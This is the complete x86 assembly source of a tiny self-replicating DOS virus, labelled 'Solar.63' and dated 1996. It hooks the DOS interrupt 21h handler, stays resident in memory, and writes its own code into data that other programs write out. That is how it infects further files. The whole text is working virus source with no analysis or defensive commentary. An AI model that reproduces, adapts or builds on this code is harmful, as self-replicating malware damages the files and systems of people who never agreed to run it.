Comment ;)
Solar.63 virus ... Coded by Solar Designer \ BPC '96
Crypted Here->|sTå¾'sw@ ;)

.radix 16

.model large
.stack 200

.code
.186

DummyStart: 
xor  ax,ax
xor  cx,cx
call VirusStarter 
push ds 
push 0
retf 

org  0B1 
VirusStarter:
xor  di,di 

VirusStart = $-1 
VirusSize = VirusEnd-VirusStart
VirusSeg = IntHandler-VirusStart

mov  si,offset VirusStart 
push ds 

mov  al,VirusSeg
mov  es,ax

mov  cl,VirusSize
segcs
rep  movsb
mov  ds,cx
mov  bl,21*4-VirusSize

cmp  ax,[di+bx]
je   Installed

xchg ax,[di+bx]
stosw
mov  ax,es
xchg ax,[di+bx]
stosw

Installed: 

pop  ds
retn 

IntHandler: 
pusha
push es

mov  di,dx 
push ds
pop  es 

mov  al,ah
add  al,33-40 
Search:            
repne scasb 
jcxz LastHandler 
cmp  word ptr [di],9CC0 
jne  Search 
 
xor  si,si
mov  cx,VirusSize 
segcs 
rep  movsb
          
LastHandler:
pop  es 
popa
db   0EA
VirusEnd:

end DummyStart
